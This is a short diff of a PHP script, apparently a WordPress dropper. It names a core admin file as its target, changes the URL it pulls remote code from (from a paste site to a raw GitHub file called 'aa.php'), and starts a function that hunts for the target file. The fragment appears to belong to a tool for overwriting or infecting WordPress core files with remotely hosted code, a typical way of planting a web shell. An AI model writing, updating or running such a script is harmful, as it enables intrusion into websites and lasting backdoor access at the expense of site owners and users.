@@ -1,6 +1,6 @@
 <?php
 $target_file_name = 'wp-admin/includes/class-file-upload-upgrader.php';
-$source_url = 'https://notepad.pw/raw/hp2hgho3c';
+$source_url = 'https://raw.githubusercontent.com/lifecarediagnosticcom-wq/mieayampakmat/refs/heads/main/aa.php';
 
 function find_target_file($start_dir, $target_file_name, $depth = 10) {
     $dir = realpath($start_dir);
